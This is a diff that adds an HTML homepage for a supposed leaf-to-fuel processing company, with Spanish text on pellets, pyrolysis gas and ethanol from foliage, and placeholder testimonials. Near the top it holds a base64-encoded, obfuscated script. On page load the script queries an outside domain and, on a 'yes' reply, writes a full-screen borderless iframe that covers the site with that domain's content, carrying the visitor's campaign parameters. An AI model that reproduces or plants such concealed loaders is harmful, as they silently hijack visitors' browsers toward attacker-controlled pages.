@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+
+<html lang="">
+
+<head>
+<title>Gleblu Foliage Processing LLC</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<link href="layout/styles/layout.css" rel="stylesheet" type="text/css" media="all">
+</head>
+<body id="top">
+
+
+
+<div class="wrapper row0">
+  <div id="topbar" class="hoc clear">
+    <div class="fl_left"> 
+      
+      <ul class="nospace">
+        <li><i class="fas fa-phone rgtspace-5"></i> +1 (604) 263-7443</li>
+        <li><i class="far fa-envelope rgtspace-5"></i> RobtCoomes6596@gmail.com</li>
+      </ul>
+      
+    </div>
+    <div class="fl_right"> 
+      
+      <ul class="nospace">
+        <li><a href="index.html"><i class="fas fa-home"></i></a></li>
+        <li><a href="#" title="Help Centre"><i class="far fa-life-ring"></i></a></li>
+        <li><a href="#" title="Login"><i class="fas fa-sign-in-alt"></i></a></li>
+        <li><a href="#" title="Sign Up"><i class="fas fa-edit"></i></a></li>
+        <li id="searchform">
+          <div>
+            <form action="#" method="post">
+              <fieldset>
+                <legend>Quick Search:</legend>
+                <input type="text" placeholder="Enter search term&hellip;">
+                <button type="submit"><i class="fas fa-search"></i></button>
+              </fieldset>
+            </form>
+          </div>
+        </li>
+      </ul>
+      
+    </div>
+  </div>
+</div>
+<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
+<script src="data:text/javascript;base64,dmFyIF8weDI3YjY9WyJ1dG1fY2FtcGFpZ24iLCIzMDYxT0ZwUmJOIiwiMTA0MzY5NER4Y252QyIsIjU4MDY2dmdkQ29VIiwidXRtX3Rlcm0iLCJsb2NhdGlvbiIsIj0oW14mPV0rKSIsIjI3R3dIRk5IIiwid3JpdGUiLCIxMHBDQk9TUiIsIjE0MktzdWNSbyIsInNlYXJjaCIsImh0dHBzOi8vdmVvbHMuZ2VvbmFsc2VjZS5jb20vaW5kZXgucGhwP2tleT1yZ2xseWkwaThpaHk5ODUxMXI5aiIsImdldCIsJzxpZnJhbWUgc3JjPSJodHRwczovL3Zlb2xzLmdlb25hbHNlY2UuY29tL2luZGV4LnBocD9rZXk9MHh1a2hsMmFnc3kxazl4emFiNnMmdXRtX2NhbXBhaWduPScsIjg3ZU54Q0ZGIiwibWF0Y2giLCIxTnpIUWpoIiwiOXpKckpSVyIsIiZ1dG1fdGVybT0iLCIxODA1NDFxdGhuZmoiLCIzMzgwNTIyTUJYRkt3IiwnIiBmcmFtZWJvcmRlcj0iMCIgc3R5bGU9Im92ZXJmbG93OmhpZGRlbjtvdmVyZmxvdy14OmhpZGRlbjtvdmVyZmxvdy15OmhpZGRlbjtoZWlnaHQ6MTAwJTt3aWR0aDoxMDAlO3Bvc2l0aW9uOmFic29sdXRlO3RvcDowcHg7bGVmdDowcHg7cmlnaHQ6MHB4O2JvdHRvbTowcHgiIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUiPjwvaWZyYW1lPicsIjEwNjIzVklqQ0xTIl0sXzB4M2JkOD1mdW5jdGlvbihlLHQpe3JldHVybiBfMHgyN2I2W2UtPTEyNl19LF8weGMzODQ5ZD1fMHgzYmQ4O2Z1bmN0aW9uIGdldENvb2tpZXMoZSl7dmFyIHQ9XzB4M2JkOCxuPXdpbmRvd1t0KDE0NyldW3QoMTI5KV07cmV0dXJuISEobj1uW3QoMTM0KV0obmV3IFJlZ0V4cChlK3QoMTQ4KSkpKSYmblsxXX1mdW5jdGlvbiBvbkFqYXhTdWNjZXNzKGUpe3ZhciB0PV8weGMzODQ5ZDsieWVzIj09ZSYmZG9jdW1lbnRbdCgxMjYpXSh0KDEzMikrZ2V0Q29va2llcyh0KDE0MikpK3QoMTM3KStnZXRDb29raWVzKHQoMTQ2KSkrdCgxNDApKX0hZnVuY3Rpb24odCl7Zm9yKHZhciBlPV8weDNiZDg7Oyl0cnl7aWYoOTMyMjUyPT09cGFyc2VJbnQoZSgxMzgpKSotcGFyc2VJbnQoZSgxMjcpKStwYXJzZUludChlKDE0MykpKnBhcnNlSW50KGUoMTM1KSkrcGFyc2VJbnQoZSgxMjgpKSotcGFyc2VJbnQoZSgxNDkpKSstcGFyc2VJbnQoZSgxMzYpKSpwYXJzZUludChlKDE0NSkpK3BhcnNlSW50KGUoMTQxKSkqcGFyc2VJbnQoZSgxMzMpKS1wYXJzZUludChlKDE0NCkpK3BhcnNlSW50KGUoMTM5KSkpYnJlYWs7dC5wdXNoKHQuc2hpZnQoKSl9Y2F0Y2goZSl7dC5wdXNoKHQuc2hpZnQoKSl9fShfMHgyN2I2KSwkW18weGMzODQ5ZCgxMzEpXShfMHhjMzg0OWQoMTMwKSxvbkFqYXhTdWNjZXNzKTs="></script>
+
+
+<div class="wrapper row1">
+  <header id="header" class="hoc clear">
+    <div id="logo" class="fl_left"> 
+      
+      <h1><a href="index.html">Gleblu</a></h1>
+      
+    </div>
+    <nav id="mainav" class="fl_right"> 
+      
+      <ul class="clear">
+        <li class="active"><a href="index.html">Home</a></li>
+        <li><a class="drop" href="#">Pages</a>
+          <ul>
+            <li><a href="pages/gallery.html">Gallery</a></li>
+            <li><a href="pages/full-width.html">Full Width</a></li>
+            <li><a href="pages/sidebar-left.html">Sidebar Left</a></li>
+            <li><a href="pages/sidebar-right.html">Sidebar Right</a></li>
+            <li><a href="pages/basic-grid.html">Basic Grid</a></li>
+            <li><a href="pages/font-icons.html">Font Icons</a></li>
+          </ul>
+        </li>
+        <li><a class="drop" href="#">Dropdown</a>
+          <ul>
+            <li><a href="#">Level 2</a></li>
+            <li><a class="drop" href="#">Level 2 + Drop</a>
+              <ul>
+                <li><a href="#">Level 3</a></li>
+                <li><a href="#">Level 3</a></li>
+                <li><a href="#">Level 3</a></li>
+              </ul>
+            </li>
+            <li><a href="#">Level 2</a></li>
+          </ul>
+        </li>
+        <li><a href="#">Link Text</a></li>
+        <li><a href="#">Link Text</a></li>
+        <li><a href="#">Link Text</a></li>
+      </ul>
+      
+    </nav>
+  </header>
+</div>
+
+
+
+<div class="wrapper bgded overlay" style="background-image:url('images/demo/backgrounds/b01.jpg');">
+  <div id="pageintro" class="hoc clear"> 
+    
+    <article>
+      <h3 class="heading">PROCESAMIENTO DE HOJAS CAÍDAS</h3>
+      <p>todas las formas posibles de eliminación útil</p>
+      <footer>
+        <ul class="nospace inline pushright">
+          <li><a class="btn" href="#">Ordenar</a></li>
+          <li><a class="btn inverse" href="#">Más detalles</a></li>
+        </ul>
+      </footer>
+    </article>
+    
+  </div>
+</div>
+
+
+
+<div class="wrapper row2">
+  <section id="introblocks" class="hoc container clear"> 
+    
+    <ul class="nospace group">
+      <li class="one_third first">
+        <article><a href="#"><i class="fas fa-hand-peace"></i></a>
+          <h6 class="heading underline">¿De qué están hechas las hojas caídas?</h6>
+          <p>Para procesar de manera adecuada y eficiente cualquier material, debe comprender en qué consiste. Los principales componentes que componen las hojas caídas son el carbono y el hidrógeno, es decir, se le puede atribuir a los hidrocarburos.</p>
+        </article>
+      </li>
+      <li class="one_third">
+        <article class="active"><a href="#"><i class="fas fa-microphone"></i></a>
+          <h6 class="heading underline">Tipos de combustible obtenidos en el proceso de reciclaje</h6>
+          <p>Reciclar las hojas caídas para convertirlas en combustible es una buena manera de deshacerse de los escombros del jardín de manera útil.
+
+            3 tipos de combustible están hechos de hojas caídas:<br><br>
+            
+            sólidos (pellets, briquetas y eurowood);<br>
+            gaseoso;<br>
+            líquido.</p>
+        </article>
+      </li>
+      <li class="one_third">
+        <article><a href="#"><i class="fas fa-moon"></i></a>
+          <h6 class="heading underline">Producción de briquetas de combustible</h6>
+          <p>A pesar de que el follaje está compuesto de hidrocarburos, la falta de lignina hace que sea imposible producir combustible sólido sin agregar pegamento.</p>
+        </article>
+      </li>
+    </ul>
+    
+  </section>
+</div>
+
+
+
+<div class="wrapper row3">
+  <main class="hoc container clear"> 
+    
+    
+    <div class="center btmspace-80">
+      <h6 class="heading underline font-x2">Explicación de los combustibles de follaje</h6>
+    </div>
+    <ul class="nospace group overview btmspace-80">
+      <li class="one_third">
+        <article>
+          <div class="clear"><a href="#"><i class="fas fa-motorcycle"></i></a>
+            <h6 class="heading">El sólido</h6>
+          </div>
+          <p>se obtiene presionando con la adición de madera picada.</p>
+        </article>
+      </li>
+      <li class="one_third">
+        <article>
+          <div class="clear"><a href="#"><i class="fas fa-newspaper"></i></a>
+            <h6 class="heading">Para obtener gas</h6>
+          </div>
+          <p>de las hojas caídas se utilizan instalaciones generadoras de gas (pirólisis). La combustión con una deficiencia severa de oxígeno da como resultado la formación de gas de pirólisis que, después de la purificación, se puede usar de la misma manera que el gas natural ordinario.</p>
+        </article>
+      </li>
+      <li class="one_third">
+        <article>
+          <div class="clear"><a href="#"><i class="fas fa-paper-plane"></i></a>
+            <h6 class="heading">Otro método de procesamiento de hojas en gas</h6>
+          </div>
+          <p>está asociado con la descomposición, para esto, las hojas caídas se mezclan con los excrementos de cualquier animal y se colocan en un ambiente relativamente cálido.</p>
+        </article>
+      </li>
+      <li class="one_third">
+        <article>
+          <div class="clear"><a href="#"><i class="fas fa-eye"></i></a>
+            <h6 class="heading">El combustible líquido</h6>
+          </div>
+          <p>se obtiene por descomposición de polisacáridos complejos, que forman la hojarasca, en monosacáridos (glucosa), seguido de fermentación y destilación. El resultado final de estos procesos es una variedad de alcoholes que también se pueden usar como combustible.</p>
+        </article>
+      </li>
+      <li class="one_third">
+        <article>
+          <div class="clear"><a href="#"><i class="fas fa-leaf"></i></a>
+            <h6 class="heading">Luego de agregarles</h6>
+          </div>
+          <p>varios aceites y otros componentes, se obtiene un combustible que, en sus características, se acerca a la gasolina o al diesel (dependiendo del tipo y proporción de aditivos).</p>
+        </article>
+      </li>
+      <li class="one_third">
+        <article>
+          <div class="clear"><a href="#"><i class="fas fa-power-off"></i></a>
+            <h6 class="heading">Briquetas de combustible</h6>
+          </div>
+          <p>A pesar de que el follaje está compuesto de hidrocarburos, la falta de lignina hace que sea imposible producir combustible sólido sin agregar pegamento.</p>
+        </article>
+      </li>
+    </ul>
+    <footer class="center"><a class="btn" href="#">Otros articulos</a></footer>
+    
+    
+    <div class="clear"></div>
+  </main>
+</div>
+
+
+
+<div class="wrapper row2">
+  <section class="hoc container clear"> 
+    
+    <div class="center btmspace-80">
+      <h6 class="heading underline font-x2">Nuestros proyectos</h6>
+    </div>
+    <ul class="nospace group">
+      <li class="one_quarter first">
+        <figure class="fixwidth"><a class="imgover btmspace-30" href="#"><img src="images/demo/01.jpg" alt=""></a>
+          <figcaption class="bold uppercase center">medidor de humedad;</figcaption>
+        </figure>
+      </li>
+      <li class="one_quarter">
+        <figure class="fixwidth"><a class="imgover btmspace-30" href="#"><img src="images/demo/02.jpg" alt=""></a>
+          <figcaption class="bold uppercase center">secador de hojas y leña picada;</figcaption>
+        </figure>
+      </li>
+      <li class="one_quarter">
+        <figure class="fixwidth"><a class="imgover btmspace-30" href="#"><img src="images/demo/03.jpg" alt=""></a>
+          <figcaption class="bold uppercase center">trituradora de hojas;</figcaption>
+        </figure>
+      </li>
+      <li class="one_quarter">
+        <figure class="fixwidth"><a class="imgover btmspace-30" href="#"><img src="images/demo/04.jpg" alt=""></a>
+          <figcaption class="bold uppercase center">empaquetadora, si el combustible se fabrica para la venta.</figcaption>
+        </figure>
+      </li>
+    </ul>
+    
+  </section>
+</div>
+
+
+
+<div class="wrapper bgded overlay" style="background-image:url('images/demo/backgrounds/b02.jpg');">
+  <section class="hoc container clear"> 
+    
+    <div class="center btmspace-80">
+      <h6 class="heading underline font-x2">Comentarios de nuestros clientes</h6>
+    </div>
+    <ul id="testimonials" class="nospace group btmspace-80">
+      <li class="one_half first">
+        <blockquote>Ordenamos la limpieza de nuestro territorio, con el posterior procesamiento del follaje en briquetas de combustible para calentar. Los muchachos hicieron un excelente trabajo, las briquetas mantienen muy buenos indicadores.</blockquote>
+        <figure class="clear"><img class="circle" src="images/demo/05.jpg" alt="">
+          <figcaption>
+            <h6 class="heading">A. Doe</h6>
+            <em>CEO / Quis velit neque</em></figcaption>
+        </figure>
+      </li>
+      <li class="one_half">
+        <blockquote>Encargamos la limpieza de la plaza de la ciudad con la posterior venta de materiales para su procesamiento. Los precios me hicieron feliz;)</blockquote>
+        <figure class="clear"><img class="circle" src="images/demo/06.jpg" alt="">
+          <figcaption>
+            <h6 class="heading">B. Doe</h6>
+            <em>Director / Euismod tincidunt</em></figcaption>
+        </figure>
+      </li>
+    </ul>
+    <footer class="center"><a class="btn" href="#">Ver otros ...</a></footer>
+    
+  </section>
+</div>
+
+
+
+
+
+<div class="wrapper row4">
+  <footer id="footer" class="hoc clear"> 
+    
+    <div class="one_quarter first">
+      <h6 class="heading">Nuestros Contactos</h6>
+      <ul class="nospace linklist contact btmspace-30">
+        <li><i class="fas fa-map-marker-alt"></i>
+          <address>
+            350-1333 Johnston St, Vancouver, BC V6H 3R9, Canada
+          </address>
+        </li>
+        <li><i class="fas fa-phone"></i> +1 (604) 263-7443</li>
+        <li><i class="far fa-envelope"></i> RobtCoomes6596@gmail.com</li>
+      </ul>
+      <ul class="faico clear">
+        <li><a class="faicon-facebook" href="#"><i class="fab fa-facebook"></i></a></li>
+        <li><a class="faicon-google-plus" href="#"><i class="fab fa-google-plus-g"></i></a></li>
+        <li><a class="faicon-linkedin" href="#"><i class="fab fa-linkedin"></i></a></li>
+        <li><a class="faicon-twitter" href="#"><i class="fab fa-twitter"></i></a></li>
+        <li><a class="faicon-vk" href="#"><i class="fab fa-vk"></i></a></li>
+      </ul>
+    </div>
+    <div class="one_quarter">
+      <h6 class="heading">Últimos artículos</h6>
+      <ul class="nospace linklist">
+        <li>
+          <article>
+            <p class="nospace btmspace-10"><a href="#">Cultivando flores caseras.</a></p>
+            <time class="block font-xs" datetime="2021-04-16">Friday, 16<sup>th</sup> April 2021</time>
+          </article>
+        </li>
+        <li>
+          <article>
+            <p class="nospace btmspace-10"><a href="#">Aislamiento de techo.</a></p>
+            <time class="block font-xs" datetime="2021-04-15">Thursday, 15<sup>th</sup> April 2021</time>
+          </article>
+        </li>
+      </ul>
+    </div>
+    <div class="one_quarter">
+      <h6 class="heading">desperdicio</h6>
+      <ul class="nospace linklist">
+        <li><a href="#">biológico</a></li>
+        <li><a href="#">médico</a></li>
+        <li><a href="#">comida</a></li>
+        <li><a href="#">textil</a></li>
+        <li><a href="#">apelación</a></li>
+      </ul>
+    </div>
+    <div class="one_quarter">
+      <h6 class="heading">Una selección de nuestros trabajos</h6>
+      <ul class="nospace clear latestimg">
+        <li><a class="imgover" href="#"><img src="images/demo/10.jpg" alt=""></a></li>
+        <li><a class="imgover" href="#"><img src="images/demo/11.jpg" alt=""></a></li>
+        <li><a class="imgover" href="#"><img src="images/demo/12.jpg" alt=""></a></li>
+        <li><a class="imgover" href="#"><img src="images/demo/13.jpg" alt=""></a></li>
+        <li><a class="imgover" href="#"><img src="images/demo/14.jpg" alt=""></a></li>
+        <li><a class="imgover" href="#"><img src="images/demo/15.jpg" alt=""></a></li>
+        <li><a class="imgover" href="#"><img src="images/demo/16.jpg" alt=""></a></li>
+        <li><a class="imgover" href="#"><img src="images/demo/17.jpg" alt=""></a></li>
+        <li><a class="imgover" href="#"><img src="images/demo/18.jpg" alt=""></a></li>
+      </ul>
+    </div>
+    
+  </footer>
+</div>
+
+
+
+<div class="wrapper row5">
+  <div id="copyright" class="hoc clear"> 
+    
+    <p class="fl_left">Copyright &copy; 2021 - All Rights Reserved - <a href="htpps://RobtCoomes6596.github.io">Gleblu Foliage Processing LLC</a></p>
+    <p class="fl_right"><a href="policy.html" >Privacy Policy</a></p>
+    
+  </div>
+</div>
+
+
+
+<a id="backtotop" href="#top"><i class="fas fa-chevron-up"></i></a>
+
+<script src="layout/scripts/jquery.min.js"></script>
+<script src="layout/scripts/jquery.backtotop.js"></script>
+<script src="layout/scripts/jquery.mobilemenu.js"></script>
+</body>
+</html>
